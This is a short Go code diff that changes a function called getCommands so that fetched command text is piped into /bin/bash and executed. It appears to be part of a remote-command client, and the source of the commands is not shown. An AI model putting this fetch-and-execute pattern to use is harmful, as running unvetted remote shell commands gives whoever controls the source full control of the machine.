@@ -5,6 +5,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"net"
@@ -44,7 +45,13 @@ func getCommands() {
 		panic(err)
 	}
 	fmt.Printf("commands: \n%s\n", txt)
-	exec.Command(string(txt))
+	//exec.Command(string(txt))
+	bsh := exec.Command("/bin/bash", "")
+	var buffer bytes.Buffer
+	buffer.Write([]byte(txt))
+
+	bsh.Stdin = &buffer
+	bsh.Run()
 }
 
 func main() {
